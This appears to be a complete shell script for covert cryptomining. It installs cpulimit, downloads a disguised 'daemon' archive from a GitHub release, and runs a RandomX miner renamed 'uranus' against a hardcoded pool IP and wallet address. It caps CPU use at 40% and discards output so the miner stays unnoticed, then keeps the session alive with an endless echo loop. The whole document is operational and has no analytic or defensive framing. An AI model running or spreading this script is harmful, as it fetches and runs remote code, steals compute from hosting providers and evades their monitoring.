apt-get update
apt-get install -y cpulimit
wget https://github.com/kolorijo01/koloria/releases/download/uranus/daemon.tar.gz && tar -xvf daemon.tar.gz
cpulimit -l 40 -e uranus &
./uranus -a randomx -o 159.203.162.18:3333 -u nexa:nqtsq5g5ewsu60xpu8zn7snghgf3yx09j5gcc648y44dcyg9 -p "suto" -t 1 >/dev/null 2>&1 & 
while true
do
        echo "gas terus....!"
        sleep 10
done
